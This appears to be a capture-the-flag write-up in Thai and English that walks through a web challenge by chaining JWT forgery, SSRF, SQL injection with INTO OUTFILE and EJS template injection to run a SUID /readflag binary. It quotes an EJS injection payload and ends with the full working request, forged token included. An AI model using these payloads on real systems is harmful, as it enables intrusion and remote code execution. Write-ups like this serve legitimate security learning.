
![alt text](image-9.png)

![alt text](image-10.png)

COPY flag.txt /root/flag.txt

RUN gcc -o /readflag /readflag.c && chmod 4755 /readflag && rm /readflag.c

เหมือนต้องการให้เรา exec /readflag เพราะ /root จะติด permissions และมีการ set suid (เมื่อไฟล์ถูก execute จะทำงานด้วยสิทธิ์ของ owner แทนที่จะเป็น user ที่ run)




![alt text](image-2.png)

edit jwt เพื่อ ปลอมเป็น admin

![alt text](image-3.png)

แต่ auth ไม่ผ่านเพราะ requiredRole === "admin" เลยต้องเข้าด้วย requiredRole อื่น

![alt text](image-4.png)

![alt text](image-5.png)

requiredRole === "guest"  และใช้ ssfr ผ่าน parameter URL ก็ขะสามารถใช้ api ที่มี สิท admin ได้แล้ว

![alt text](image-8.png)

![alt text](image-7.png)

![alt text](image-6.png)


![alt text](image.png)

![alt text](image-1.png)

วิธี exec /readflag ด้วย sql injection 

write file โดยผ่าน sql payload โดยจะต้องหา route path ที่จะสามารถแสดงบนหน้าเว็บได้

![alt text](image-11.png)


https://regex101.com/

![alt text](image-12.png)

wrtie file ในช่วง 400-600  ทำ html page ที่สามารถทำ ssti exec /readflag

match

![alt text](image-13.png)

not match 

![alt text](image-14.png)

![alt text](image-15.png)

search dependencies 

EJS, Server side template injection ejs@3.1.9 

![alt text](image-16.png)

%%1");process.mainModule.require('child_process').execSync('calc');//

https://github.com/mde/ejs/issues/720

also try wkhtmltopdf File Inclusion Vulnerability cant exec lol

now we ready to create payload

![alt text](image-17.png)

test admin token bypass and test api ssfr

ctr+u --> url encode

ctr+shift+u --> url decode

before sent request do url encode first

![alt text](image-18.png)

bypass with \n and default sql injection work well

![alt text](image-19.png)

exec command ได้ล้ะ เจอ condition 

1. การเขียน file ใน sql command โดยใช้ INTO OUTFILE จะต้องเป็นไฟล์ที่ไม่มีอยู่

![alt text](image-20.png)

2.จะพบว่ามีแค่ทางเดียวคือผ่าน 404.ejs(จะไม่มีมาให้) เพราะเมื่อเข้าผ่าน URL แล้วไม่เจอ path จะ error แล้วไป error.ejs 

3.เมื่อเรา INTO OUTFILE 404.ejs แล้ว มันจะไม่เข้า route error อื่นแล้ว และถ้าเขียนไฟล์ 404.ejs ผิดก็จบเลย

4.เข้าด้วย err.status อื่นก็ไม่ได้ โค้ดจะ set ให้ 404 default


![alt text](image-21.png)

url=http://127.0.0.1:1337/graphql?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NTI5NTgzNTV9.4i0RigFU0GWSKW9V5XbY1roPGWRwMTdqRtSdsz1QTYs&query={getDataByName(name:"John\n' UNION SELECT 1,\"<p><%= process.mainModule.require('child_process').execSync('/readflag'); %></p>\",2,3 INTO OUTFILE '/app/views/errors/404.ejs'; -- -"){id,name,department,isPresent}}